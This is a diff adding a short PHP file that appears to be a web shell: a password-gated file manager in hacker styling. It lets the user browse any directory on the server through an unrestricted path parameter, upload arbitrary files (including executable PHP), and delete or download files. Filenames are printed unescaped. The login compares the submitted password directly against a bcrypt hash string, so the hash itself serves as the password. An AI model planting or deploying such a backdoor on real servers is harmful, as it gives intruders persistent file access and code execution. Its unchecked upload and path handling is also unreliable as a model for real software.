@@ -1,0 +1,31 @@
+<?php
+session_start();
+$pass="$2y$10$Qgw3mUJJbnKaoTpnOfjFM.sY4LaYmuxaLKg8oi.75lPvmNTuoQ7.S";
+
+// login
+if(isset($_POST['p']) && $_POST['p']===$pass){$_SESSION['ok']=1;}
+if(isset($_GET['out'])){session_destroy();header("Location:?");exit;}
+if(!isset($_SESSION['ok'])){echo '<form method=post>Password:<input type=password name=p><input type=submit></form>';exit;}
+
+// path
+$path=realpath($_GET['d']??__DIR__);
+
+// upload
+if(!empty($_FILES['f']['tmp_name'])) move_uploaded_file($_FILES['f']['tmp_name'],$path."/".$_FILES['f']['name']);
+
+// delete
+if(isset($_GET['del'])) unlink($path."/".basename($_GET['del']));
+
+// list
+$files=scandir($path);
+?>
+<!doctype html><html><body style="background:black;color:lime;font-family:monospace">
+<b>Path:</b> <?=$path?> | <a href="?out=1" style="color:red">Logout</a><hr>
+<form method=post enctype=multipart/form-data>
+<input type=file name=f><input type=submit value=Upload>
+</form><hr><ul>
+<?php foreach($files as $f){ if($f==".")continue; $fp=$path."/".$f;
+if(is_dir($fp)) echo "<li>[DIR] <a href='?d=".urlencode($fp)."'>$f</a></li>";
+else echo "<li>[FILE] $f <a href='?d=".urlencode($path)."&del=".urlencode($f)."' style=color:red>Delete</a> <a href='$fp' style=color:cyan target=_blank>Download</a></li>";
+} ?>
+</ul></body></html>
